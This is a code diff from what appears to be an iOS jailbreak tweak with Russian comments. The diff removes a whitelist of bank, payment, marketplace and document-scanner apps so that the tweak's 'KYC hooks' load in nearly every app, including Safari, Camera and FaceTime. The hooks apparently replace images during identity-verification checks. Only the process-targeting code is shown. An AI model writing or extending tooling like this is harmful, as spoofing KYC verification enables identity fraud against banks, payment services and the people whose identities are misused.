@@ -248,41 +248,20 @@ static UIImage *_kyc_replacementUIImage(void) {
 // =============================================================================
 // ctor — загружаемся ТОЛЬКО в KYC/банковских процессах
 // =============================================================================
+// FIX (v1.8.1): убран whitelist — KYC-хуки безопасны (только delegate-swizzle,
+// никаких objc_copyClassList / class_addMethod на пользовательских классах),
+// поэтому грузимся во всех приложениях, где загрузился .dylib.
 static BOOL _kyc_isTargetProcess(NSString *bid) {
     if (!bid) return NO;
-    static NSArray *targets = nil;
-    static dispatch_once_t once;
-    dispatch_once(&once, ^{
-        targets = @[
-            // Shopping / маркетплейсы
-            @"com.amazon.Amazon",
-            @"com.ebay.iphone.shopping",
-            @"com.poshmark.poshmark",
-            @"com.offerup.offerup",
-            // Payments
-            @"com.paypal.PPClient",
-            @"com.venmo.Venmo",
-            @"com.cashapp.squarecash",
-            @"com.konylabs.westernunion",
-            // Банки
-            @"com.chase.sig.ios",
-            @"com.bankofamerica.BofAMobileBanking",
-            @"com.wellsfargo.wellsfargomobile",
-            @"com.key.KeyBank",
-            @"com.citigroup.citimobile",
-            // Доставка/такси (часто KYC водителя)
-            @"com.doordash.DoorDash-Consumer",
-            // Сканеры документов
-            @"com.adobe.scan.ios",
-            @"com.microsoft.Office.Lens",
-            @"com.readdle.scanner",
-            @"net.doo.DMobile",
-        ];
-    });
-    for (NSString *t in targets) {
-        if ([bid hasPrefix:t] || [bid isEqualToString:t]) return YES;
+    // Не лезем в служебные/системные процессы — на всякий случай.
+    if ([bid hasPrefix:@"com.apple."]) {
+        // Разрешаем только Safari/Camera/FaceTime — там может быть KYC через WebView.
+        if ([bid isEqualToString:@"com.apple.mobilesafari"]) return YES;
+        if ([bid isEqualToString:@"com.apple.camera"]) return YES;
+        if ([bid isEqualToString:@"com.apple.facetime"]) return YES;
+        return NO;
     }
-    return NO;
+    return YES;
 }
 
 %ctor {
